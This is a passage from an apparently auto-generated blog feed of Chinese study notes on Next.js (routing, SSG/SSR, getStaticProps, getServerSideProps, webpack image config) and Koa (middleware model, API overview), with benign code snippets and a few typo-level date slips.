title="弱项"></a>弱项</h2><ul><li>完全没有提供数据库相关功能，可行搭配 Sequelize 或 TypeORM</li><li>完全没有提供测试相关功能，可自行搭配 Jest 或 Cypress</li><li>有一个叫做 <a href="https://github.com/blitz-js/blitz">Blitz.js</a> 的框架在这些方向上努力</li></ul><h1 id="Link-快速导航"><a href="#Link-快速导航" class="headerlink" title="Link 快速导航"></a>Link 快速导航</h1><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul><li>把 <a href=xxx> 点击链接 </a> 改成</li><li><Link href=xxx><a> 点击链接 </a></Link></li></ul><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>页面不会刷新，用 AJAX 请求新页面内容</li><li>不会请求重复的HTML、CSS、JS</li><li>自动在页面插入新内容、删除旧内容</li><li>因为省了很多请求和解析过程，所以速度极快</li></ul><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><ul><li>借鉴了 Rails Turbolinks、pjax 等技术</li></ul><p><img src="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/img.png" alt="传统导航，访问 page2 时是浏览器请求"></p><p><img src="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/img_1.png" alt="相比传统导航，访问 page2 时是 page1 用AJAX请求页面（在network中可见）"></p><h1 id="同构代码"><a href="#同构代码" class="headerlink" title="同构代码"></a>同构代码</h1><h2 id="一份代码运行在两端（省了一份）"><a href="#一份代码运行在两端（省了一份）" class="headerlink" title="一份代码运行在两端（省了一份）"></a>一份代码运行在两端（省了一份）</h2><ul><li>在组件里写一句 console.log(‘执行了’)</li><li>你会发现 Node 控制台会输出这句话</li><li>同样你会发现 Chrome 控制台也会输出这句话</li></ul><h2 id="注意差异"><a href="#注意差异" class="headerlink" title="注意差异"></a>注意差异</h2><ul><li>不是所有代码都会运行，有些需要用户触发</li><li>不是所有的 API 都能用，比如 window 在 Node 里报错</li></ul><h1 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h1><h2 id="pages-x2F-app-js"><a href="#pages-x2F-app-js" class="headerlink" title="pages&#x2F;_app.js"></a>pages&#x2F;_app.js</h2><ul><li>export default function App 是每个页面的根组件</li><li>页面切换时 App 不会销毁，App 里面的组件会销毁</li><li>可用 App 保存全局状态</li></ul><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li>创建 _app.js 之后需要重启服务（yarn dev）</li></ul><h2 id="全局-CSS"><a href="#全局-CSS" class="headerlink" title="全局 CSS"></a>全局 CSS</h2><h3 id="放在-app-js-里"><a href="#放在-app-js-里" class="headerlink" title="放在 _app.js 里"></a>放在 _app.js 里</h3><ul><li>import ‘..&#x2F;styles&#x2F;global.css’</li><li>因为切换页面时 App 不会销毁</li><li>其他地方不能 import global.css</li><li>其他地方只能写局部 CSS</li></ul><h3 id="插曲"><a href="#插曲" class="headerlink" title="插曲"></a>插曲</h3><ul><li>相对引用好烦，能改成 import ‘style&#x2F;global.css’吗？</li><li>文档 <a href="https://nextjs.org/docs/advanced-features/module-path-aliases">Absolute Import</a> 章节（baseUrl: ‘.’）</li></ul><h2 id="局部-CSS"><a href="#局部-CSS" class="headerlink" title="局部 CSS"></a>局部 CSS</h2><h3 id="官方支持"><a href="#官方支持" class="headerlink" title="官方支持"></a>官方支持</h3><ul><li>默认支持 styled-jsx 和 CSS Modules</li><li>一般来说，简单需求用前者，复杂需求用后者</li></ul><h3 id="React-个人体验"><a href="#React-个人体验" class="headerlink" title="React 个人体验"></a>React 个人体验</h3><ul><li>styled-jsx 不方便分离 CSS 和 JS</li><li>CSS Modules 用起来太麻烦</li><li>styled-components 用起来顺手</li></ul><h2 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h2><h3 id="next-推荐放在-public-里"><a href="#next-推荐放在-public-里" class="headerlink" title="next 推荐放在 public 里"></a>next 推荐放在 public 里</h3><ul><li>个人觉得不太好</li><li>因为放在 public 里不支持改文件名（如哈希）</li></ul><h3 id="所以需要配置自定义-webpack-config"><a href="#所以需要配置自定义-webpack-config" class="headerlink" title="所以需要配置自定义 webpack config"></a>所以需要配置自定义 webpack config</h3><ul><li>创建 next.config.js</li><li>栗子🌰：使用 file-loader 或者 next-images</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file-loader </span></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  <span class="attr">webpack</span>: <span class="function">(<span class="params">config, options</span>) =&gt;</span> &#123;</span><br><span class="line">    config.module.rules.<span class="built_in">push</span>(&#123;</span><br><span class="line">      <span class="attr">test</span>: <span class="regexp">/\.(jpg|png|gif|svg)$/</span>,</span><br><span class="line">      <span class="attr">use</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">          <span class="attr">options</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;[name].[contenthash].[ext]&#x27;</span>, <span class="comment">// 文件名称</span></span><br><span class="line">            outputPath: <span class="string">&#x27;static&#x27;</span>, <span class="comment">// 硬盘路径</span></span><br><span class="line">            publicPath: <span class="string">&#x27;_next/static&#x27;</span>, <span class="comment">// 网站路径</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// next-images</span></span><br><span class="line"><span class="keyword">const</span> withImages = <span class="built_in">require</span>(<span class="string">&#x27;next-images&#x27;</span>)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">withImages</span>(&#123;</span><br><span class="line">  <span class="title function_">webpack</span>(<span class="params">config, options</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="启用-Typescript"><a href="#启用-Typescript" class="headerlink" title="启用 Typescript"></a>启用 Typescript</h1><h2 id="创建-tsconfig-json"><a href="#创建-tsconfig-json" class="headerlink" title="创建 tsconfig.json"></a>创建 tsconfig.json</h2><ul><li>tsc –init 运行后得到 tsconfig.json 或者 touch tsconfig.ts</li><li>将 jsconfig.json 里面的配置合并到 tsconfig.json</li><li>删除 jsconfig.json</li></ul><h2 id="重启服务-yarn-dev"><a href="#重启服务-yarn-dev" class="headerlink" title="重启服务 yarn dev"></a>重启服务 yarn dev</h2><ul><li>会自动改写 tsconfig.json</li><li>更改文件名后缀由 .js 改为 .tsx</li><li>不需要一次性将所有文件全部改完</li><li><strong>在 tsconfig.json 里添加</strong></li><li>“noImlicitAny”: true (禁用隐式的 any)</li></ul><h1 id="Next-js-API"><a href="#Next-js-API" class="headerlink" title="Next.js API"></a>Next.js API</h1><h2 id="目前的页面"><a href="#目前的页面" class="headerlink" title="目前的页面"></a>目前的页面</h2><ul><li>index 和 posts 都是 HTML</li><li>但实际开发中我们需要请求 &#x2F;user &#x2F;shops 等 API</li><li>但返回的内容是 JSON 格式的字符串</li><li><strong>使用 Next.js API</strong></li><li>路径为 &#x2F;api&#x2F;v1&#x2F;posts 以便与 &#x2F;posts 区分开来</li><li>默认导出的函数的类型为 NextApiHandler</li><li>该代码只运行在 Node.js 里，不运行在浏览器中</li><li>栗子🌰：<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> posts: NextApiHandler = <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span>;</span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> posts = <span class="keyword">await</span> getPosts() <span class="comment">// 数据库操作</span></span><br><span class="line"> res.end(JSON.stringify(posts))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> posts</span><br></pre></td></tr></table></figure></li></ul><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="x2F-api-x2F-里的文件是-API"><a href="#x2F-api-x2F-里的文件是-API" class="headerlink" title="&#x2F;api&#x2F; 里的文件是 API"></a>&#x2F;api&#x2F; 里的文件是 API</h3><ul><li>一般返回 JSON 格式的字符串</li><li>但也不是不能返回 HTML， 比如 res.end(‘&lt;html’&gt;&lt;&#x2F;html’&gt;)</li></ul><h3 id="API-文件默认导出-NextAPIHandler"><a href="#API-文件默认导出-NextAPIHandler" class="headerlink" title="API 文件默认导出 NextAPIHandler"></a>API 文件默认导出 NextAPIHandler</h3><ul><li>这是一个函数类型</li><li>第一个参数是请求</li><li>第二个参数是对象</li><li>因为 Next.js 是基于 Express 的，所以支持 Express 的中间件，下文在分析，<a href="https://nextjs.org/docs/api-routes/api-middlewares#connectexpress-middleware-support">官方文档</a></li></ul><h1 id="Next-js-三种渲染方式"><a href="#Next-js-三种渲染方式" class="headerlink" title="Next.js 三种渲染方式"></a>Next.js 三种渲染方式</h1><h2 id="客户端渲染"><a href="#客户端渲染" class="headerlink" title="客户端渲染"></a>客户端渲染</h2><ul><li>只在浏览器上执行的渲染</li></ul><h2 id="静态页面生成（SSG）"><a href="#静态页面生成（SSG）" class="headerlink" title="静态页面生成（SSG）"></a>静态页面生成（SSG）</h2><ul><li>Static Site Generation，解决白屏问题、SEO问题</li><li>无法生成用户相关的内容（所有用户请求的结果都一样）</li></ul><h2 id="服务端渲染（SSR）"><a href="#服务端渲染（SSR）" class="headerlink" title="服务端渲染（SSR）"></a>服务端渲染（SSR）</h2><ul><li>解决白屏问题、SEO 问题</li><li>可以生成用户相关内容（不同用户结果不同）</li></ul><blockquote><p>注意：SSR 和 SSG 都属于预渲染 Pre-rendering</p></blockquote><h2 id="旧瓶装新酒"><a href="#旧瓶装新酒" class="headerlink" title="旧瓶装新酒"></a>旧瓶装新酒</h2><h3 id="三种渲染方式分别对应"><a href="#三种渲染方式分别对应" class="headerlink" title="三种渲染方式分别对应"></a>三种渲染方式分别对应</h3><ul><li>客户端渲染 – 用 JS、Vue、React 创建 HTML</li><li>SSG – 页面静态化，把 PHP 提前渲染成HTML</li><li>SSR – PHP、Python、Ruby、Java 后台的基本功能</li></ul><h3 id="与传统的后端不同点"><a href="#与传统的后端不同点" class="headerlink" title="与传统的后端不同点"></a>与传统的后端不同点</h3><ul><li>Next.js 的预渲染可以与前端 React 无缝对接</li></ul><h2 id="客户端渲染的缺点"><a href="#客户端渲染的缺点" class="headerlink" title="客户端渲染的缺点"></a>客户端渲染的缺点</h2><h3 id="白屏"><a href="#白屏" class="headerlink" title="白屏"></a>白屏</h3><ul><li>在 AJAX 得到相应之前，页面中 Loading</li></ul><h3 id="SEO-不友好"><a href="#SEO-不友好" class="headerlink" title="SEO 不友好"></a>SEO 不友好</h3><ul><li>搜索引擎访问页面，看不到 AJAX 得到的数据</li><li>因为搜索引擎默认不会执行 JS，只能看到 HTML</li></ul><h2 id="静态内容-VS-动态内容"><a href="#静态内容-VS-动态内容" class="headerlink" title="静态内容 VS 动态内容"></a>静态内容 VS 动态内容</h2><p><img src="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/img_2.png"></p><h3 id="上图的静态内容"><a href="#上图的静态内容" class="headerlink" title="上图的静态内容"></a>上图的静态内容</h3><ul><li>是服务渲染的，还是客户端渲染的？</li><li>渲染了几次？一次还是两次？</li></ul><h3 id="参考-React-SSR-的官方文档"><a href="#参考-React-SSR-的官方文档" class="headerlink" title="参考 React SSR 的官方文档"></a>参考 React SSR 的官方文档</h3><ul><li>推荐在后端 <a href="https://reactjs.org/docs/react-dom-server.html#rendertostring">renderToString() 在前端 hydrate()</a></li><li>hydrate() 混合，会保留 HTML 并附上事件监听</li><li>也就是说后端渲染 HTML，前端添加监听</li><li>前端也会渲染一次，用以确保前后端渲染结果一致（如何看出渲染了两次，当使用 styled-conponents 时会有报错）</li></ul><h3 id="推论"><a href="#推论" class="headerlink" title="推论"></a>推论</h3><ul><li>所有页面至少有一个标签是静态内容，由服务端渲染</li></ul><h2 id="静态页面生成（SSG）-1"><a href="#静态页面生成（SSG）-1" class="headerlink" title="静态页面生成（SSG）"></a>静态页面生成（SSG）</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><ul><li>你有没有想过，其实每个人看到的文章列表都是一样的</li><li>那么为什么还需要在每个人的浏览器渲染一次</li><li>为什么不在后端渲染好，然后发给每个人</li><li>N 次渲染变成了 1 次渲染</li><li>N 次客户端渲染变成了1 次静态页面生成</li><li>这个过程叫做<strong>动态内容静态化</strong></li></ul><h3 id="getStaticProps-获取-posts"><a href="#getStaticProps-获取-posts" class="headerlink" title="getStaticProps 获取 posts"></a>getStaticProps 获取 posts</h3><h4 id="声明位置"><a href="#声明位置" class="headerlink" title="声明位置"></a>声明位置</h4><ul><li>每个 page 不是默认导出一个函数么？</li><li>把 getStaticProps 声明在这个函数旁边即可</li><li>栗子🌰：</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getStaticProps: GetStaticProps = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> posts = <span class="keyword">await</span> getPosts()</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    props: &#123;</span><br><span class="line">      posts,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>必须按照这个格式，不能变（命名和返回值{ props: {…} }）</p></blockquote><p><img src="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/img_3.png"></p><blockquote><p>打开控制台我们可以清楚的看见，原来我们需要通过 AJAX 的内容，直接被打包进 HTML 里面了，这样浏览器不需要用 AJAX 就可以直接拿到数据了！</p></blockquote><h3 id="这就是同构-SSR-的好处：后端数据可以传给前端"><a href="#这就是同构-SSR-的好处：后端数据可以传给前端" class="headerlink" title="这就是同构 SSR 的好处：后端数据可以传给前端"></a>这就是同构 SSR 的好处：后端数据可以传给前端</h3><h3 id="前端-JSON-parse-一下就能够得到了-posts（现在-Next-js-帮你做了）"><a href="#前端-JSON-parse-一下就能够得到了-posts（现在-Next-js-帮你做了）" class="headerlink" title="前端 JSON.parse 一下就能够得到了 posts（现在 Next.js 帮你做了）"></a>前端 JSON.parse 一下就能够得到了 posts（现在 Next.js 帮你做了）</h3><h3 id="难道-PHP-x2F-Java-x2F-Python-就做不到么"><a href="#难道-PHP-x2F-Java-x2F-Python-就做不到么" class="headerlink" title="难道 PHP &#x2F; Java &#x2F; Python 就做不到么"></a>难道 PHP &#x2F; Java &#x2F; Python 就做不到么</h3><ul><li>其实也可以做到，思路一样</li><li>但是他们不支持 JSX，很难与 Reactr 无缝对接</li><li>而且他们的对象不能直接提供 JS 用（他们又有 int 之类的类型），需要类型转换</li></ul><h3 id="静态化的时机"><a href="#静态化的时机" class="headerlink" title="静态化的时机"></a>静态化的时机</h3><ul><li>在** 开发环境**，每次请求都会运行一次 getStaticProps</li><li>这是为了方便修改代码重新运行</li><li>在生产环境，getStaticProps 只会在 build 时运行一次</li><li>这样可以提供一份 HTML 给所有用户下载</li></ul><h2 id="解读打包文件"><a href="#解读打包文件" class="headerlink" title="解读打包文件"></a>解读打包文件</h2><ul><li>λ  (Server)  server-side renders at runtime (uses getInitialProps or getServerSideProps)</li><li>○  (Static)  automatically rendered as static HTML (uses no initial props)</li><li>●  (SSG)     automatically generated as static HTML + JSON (uses getStaticProps)</li></ul><h2 id="动态内容静态化"><a href="#动态内容静态化" class="headerlink" title="动态内容静态化"></a>动态内容静态化</h2><ul><li>如果内容与用户无关，那么可以提前静态化</li><li>通过 getStaticProps 可以获取数据</li><li><strong>静态内容 + 数据（本地获取）</strong> 就得到了完整页面</li><li>代替了之前的<strong>静态内容 + 动态内容（AJAX获取）</strong></li></ul><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>生产环境中直接给出完整页面</li><li>首屏不会白屏</li><li>搜索引擎能看到页面内容（方便 SEO）</li></ul><h1 id="getServerSideProps"><a href="#getServerSideProps" class="headerlink" title="getServerSideProps"></a>getServerSideProps</h1><h2 id="用户相关动态内容"><a href="#用户相关动态内容" class="headerlink" title="用户相关动态内容"></a>用户相关动态内容</h2><h3 id="就难提前静态化"><a href="#就难提前静态化" class="headerlink" title="就难提前静态化"></a>就难提前静态化</h3><ul><li>需要在<strong>用户请求时</strong>，获取用户信息，然后<strong>通过用户信息去数据库</strong>拿数据</li><li>如果因要做，就要给每个用户都提前创建一个页面（占内存，麻烦）</li><li>但还有时候这些数据<strong>更新极快</strong>，无法提前静态化</li><li>比如微博首页的信息流</li></ul><h3 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h3><ul><li>要么客户端渲染，下拉更新（1）</li><li>要么服务端渲染，下拉更新（2）</li><li>但这次的服务端渲染不能用 getStaticProps</li><li>因为 getStaticProps 是在 build 时执行的</li><li>所以要用 getServerSideProps</li></ul><h2 id="运行时机"><a href="#运行时机" class="headerlink" title="运行时机"></a>运行时机</h2><ul><li>无论是开发环境还是生产环境</li><li>都是在<strong>请求到来之后运行</strong> getServerSideProps</li><li><em>与 getStaticProps 区别，build 时运行一次</em></li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>context，类型为 NextPageContext</li><li>context.req &#x2F; context.res 可以获取请求和响应</li><li>一般只需要用到 context.req</li><li>栗子🌰：</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getServerSideProps: GetServerSideProps = <span class="keyword">async</span> (context) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> ua = context.req.headers[<span class="string">&quot;user-agent&quot;</span>]</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    props: &#123;</span><br><span class="line">      ua,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>必须按照这个格式，不能变（命名和返回值{ props: {…} }）</p></blockquote><blockquote><p>这个栗子展示了用户访问的浏览器，这些信息我们不可能提前（在用户请求之前）知道</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="静态内容"><a href="#静态内容" class="headerlink" title="静态内容"></a>静态内容</h2><ul><li>直接输出 HTML，没有术语</li></ul><h2 id="动态内容"><a href="#动态内容" class="headerlink" title="动态内容"></a>动态内容</h2><ul><li>术语：客户端渲染，通过 AJAX 请求，渲染成 HTML</li></ul><h2 id="动态内容静态化-1"><a href="#动态内容静态化-1" class="headerlink" title="动态内容静态化"></a>动态内容静态化</h2><ul><li>术语：SSG，通过 getStaticProps 获取用户无关内容</li></ul><h2 id="用户相关动态内容静态化"><a href="#用户相关动态内容静态化" class="headerlink" title="用户相关动态内容静态化"></a>用户相关动态内容静态化</h2><ul><li>术语： SSR，通过 getServerSideProps 获取请求</li><li>缺点：无法获客户端信息，如浏览器窗口大小</li></ul><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/img_4.png"></p><blockquote><p>有动态内容吗？没有什么都不用做，自动渲染为 HTML<br>动态内容跟客户端相关？相关就只能用客户端渲染（BSR）<br>动态内容跟请求&#x2F;用户相关吗？相关就只能用服务端渲染（SSR）或 BSR<br>其他情况可以用 SSG 或 BSR</p></blockquote><h1 id="补充：路由的另一个功能"><a href="#补充：路由的另一个功能" class="headerlink" title="补充：路由的另一个功能"></a>补充：路由的另一个功能</h1><h2 id="点击列表查看详情功能"><a href="#点击列表查看详情功能" class="headerlink" title="点击列表查看详情功能"></a>点击列表查看详情功能</h2><ul><li>简单，不就是加个 Link&gt;a 标签吗</li><li>href&#x3D;{<code>/post/$&#123;id&#125;</code>}<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">href</span>=<span class="string">&quot;/posts/[id]&quot;</span> <span class="attr">as</span>=</span></span><span class="template-variable">&#123;`/posts/$&#123;post.id&#125;</span><span class="language-xml"><span class="tag">`&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">a</span>&gt;</span></span><span class="template-variable">&#123;post.title&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><h2 id="但是新建的文件叫做什么"><a href="#但是新建的文件叫做什么" class="headerlink" title="但是新建的文件叫做什么"></a>但是新建的文件叫做什么</h2><ul><li>pages&#x2F;posts&#x2F;[id].tsx</li><li>没错，文件名就是 [id].tsx，（约定）</li></ul><h2 id="x2F-pages-x2F-posts-x2F-id-tsx-的作用"><a href="#x2F-pages-x2F-posts-x2F-id-tsx-的作用" class="headerlink" title="&#x2F;pages&#x2F;posts&#x2F;[id].tsx 的作用"></a>&#x2F;pages&#x2F;posts&#x2F;[id].tsx 的作用</h2><ul><li>既声明了路由 &#x2F;posts&#x2F;:id</li><li>又是 &#x2F;posts&#x2F;:id 的页面实现程序</li><li>妙啊</li></ul><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><ul><li>用 getServerSideProps 渲染列表页面</li><li>详情页用 getStaticProps，从第一个参数接受 params.id</li><li>用 getStaticPaths 返回 id 列表</li></ul><p><img src="/Blog/2020/07/19/javascript/Next%E5%85%A8%E8%A7%A3/index/img_5.png"></p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Koa 全解</title>
      <link href="/Blog/2020/07/18/node_js/Koa%E5%85%A8%E8%A7%A3/index/"/>
      <url>/Blog/2020/07/18/node_js/Koa%E5%85%A8%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Koa-的时间线"><a href="#Koa-的时间线" class="headerlink" title="Koa 的时间线"></a>Koa 的时间线</h1><h3 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h3><ul><li>2016 年 6 月，TJ 开始编写 Express</li><li>2014 年发展到 v0.12，基本成熟，移交给 StrongLoop</li></ul><h3 id="Koa"><a href="#Koa" class="headerlink" title="Koa"></a>Koa</h3><ul><li>2013 年 8 月， TJ 开始编写 Koa</li><li>2015 年 8 月，Koa 发布 v1.0.0 版本</li></ul><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><ul><li>2013 年 3 月，Node.js v0.12 发布</li><li>2014 年 12 月，io.js 不满 Node.js 的管理发起分裂</li><li>2015 年 2 月，Node.js v0.12 发布</li><li>2015 年 9 月，Node.js 与 io.js 合并为 Node.js v4.0</li></ul><h3 id="Koa对-Node-js-的支持"><a href="#Koa对-Node-js-的支持" class="headerlink" title="Koa对 Node.js 的支持"></a>Koa对 Node.js 的支持</h3><ul><li>2015 年 2 月，Koa 放弃对 Node v0.11 以下的支持，并开始支持 io.js</li><li>2015 年 10 月，Koa 放弃对 Node v4.0 以下的支持，并用 ES6 重写所有代码，发布 v2.0.0 内测版</li></ul><h1 id="Koa-对比-Express"><a href="#Koa-对比-Express" class="headerlink" title="Koa 对比 Express"></a>Koa 对比 Express</h1><h3 id="编程模型不同"><a href="#编程模型不同" class="headerlink" title="编程模型不同"></a>编程模型不同</h3><ul><li>Express 的中间件是<strong>线型</strong>的</li><li>Koa 的中间件是 <strong>U 型</strong>的</li></ul><h3 id="对语言特性的使用不同"><a href="#对语言特性的使用不同" class="headerlink" title="对语言特性的使用不同"></a>对语言特性的使用不同</h3><ul><li>Express 使用回调函数 next()</li><li>Koa v1.x 使用 generator 语法</li><li>Koa v2.x 使用 async &#x2F; await 语法</li></ul><blockquote><p>所以<br>2011 ~ 2016 年，你大概率会使用 Express<br>2017 年之后，你可能会使用 Koa</p></blockquote><h1 id="Koa-的中间件模型"><a href="#Koa-的中间件模型" class="headerlink" title="Koa 的中间件模型"></a>Koa 的中间件模型</h1><p><img src="/Blog/2020/07/18/node_js/Koa%E5%85%A8%E8%A7%A3/index/img.png"></p><h3 id="运行顺序"><a href="#运行顺序" class="headerlink" title="运行顺序"></a>运行顺序</h3><p><img src="/Blog/2020/07/18/node_js/Koa%E5%85%A8%E8%A7%A3/index/img_1.png"></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="app-xxx"><a href="#app-xxx" class="headerlink" title="app.xxx"></a><a href="https://koajs.com/#application">app.xxx</a></h4><ul><li>app.env</li><li>app.proxy</li><li>app.subdomainOffset</li><li>app.listen()</li><li>app.callback()</li><li><strong>app.use(fn) – 插入中间件 fn</strong></li><li>app.keys</li><li>app.context</li><li><strong>app.on(‘error’, fn) – 错误处理</strong></li><li><strong>app.emit – 触发事件</strong></li></ul><h4 id="ctx-xxx"><a href="#ctx-xxx" class="headerlink" title="ctx.xxx"></a><a href="https://koajs.com/#context">ctx.xxx</a></h4><ul><li>ctx.req &#x2F;&#x2F; Node.js 封装的请求</li><li>ctx.res</li><li>ctx.request &#x2F;&#x2F; Koa 封装的请求</li><li>ctx.response</li><li>ctx.state – 跨中间件分享数据</li><li>ctx.app</li><li>ctx.cookies.get &#x2F; set</li><li>ctx.throw</li><li>ctx.assert</li><li>ctx.respond 不推荐使用</li></ul><h4 id="ctx-request-xxx"><a href="#ctx-request-xxx" class="headerlink" title="ctx.request.xxx"></a><a href="https://koajs.com/#request">ctx.request.xxx</a></h4><ul><li>request.header</li><li>request.headers &#x2F;&#x2F; as alias request.header</li><li><strong>request.method</strong></li><li>request.length</li><li>request.url</li><li>request.origin</li><li>request.href</li><li><strong>request.path</strong></li><li>request.quertstring</li><li>request.search</li><li>request.host</li><li>request.hostname</li><li>request.URL</li><li>request.type</li><li>request.charset</li><li><strong>request.query</strong></li><li>request.fresh</li><li>request.stale</li><li>request.protocol</li><li>…</li><li><strong>request.idmpotent</strong></li><li><strong>request.get(field)</strong></li></ul><h4 id="ctx-response-xxx"><a href="#ctx-response-xxx" class="headerlink" title="ctx.response.xxx"></a><a href="https://koajs.com/#response">ctx.response.xxx</a></h4><ul><li>response.header</li><li>response.headers</li><li>response.socket</li><li><strong>response.status</strong></li><li>response.message</li><li>response.length</li><li><strong>response.body x 5</strong></li><li>response.get()</li><li><strong>response.set() x 2</strong></li><li><strong>response.append()</strong></li><li>response.type</li><li>response.is()</li><li>response.redirect(url, [alt])</li><li>response.attachment()</li><li>response.headerSent</li><li>response.flushHeaders()</li><li>…</li></ul><h2 id="框架推荐"><a href="#框架推荐" class="headerlink" title="框架推荐"></a><a href="https://2019.stateofjs.com/back-end/">框架推荐</a></h2><p>Next.js &#x2F; Nuxt &#x2F; Nest</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Express 全解</title>
      <link href="/Blog/2020/07/18/node_js/Express%E5%85%A8%E8%A7%A3/index/"/>
      <url>/Blog/2020/07/18/node_js/Express%E5%85%A8%E8%A7%A3/index/</url>
      
